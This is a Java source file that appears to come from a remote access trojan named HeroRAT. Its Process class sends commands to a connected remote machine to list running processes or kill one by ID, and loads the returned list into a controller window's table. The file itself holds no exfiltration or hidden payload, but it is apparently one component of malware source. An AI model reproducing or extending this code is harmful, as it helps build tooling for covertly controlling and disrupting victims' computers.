package net.herorat.features.process;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet9Process;


public class Process
{
	public static void send(Server server)
	{
		Packet p = new Packet9Process(server.outputstream, new String[] { "get" });
		p.write();
	}
	
	public static void sendKill(Server server, String id)
	{
		Packet p = new Packet9Process(server.outputstream, new String[] { "kill", id });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab7.combo_selected_item))) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		String[] splitted_raw = buffer.toString().split("###");
		for (String raw : splitted_raw)
		{
			server.array_process.add(raw.split(";"));
			Main.mainWindow.panel_tab7.model_process.addRow(raw.split(";"));
		}
	}
}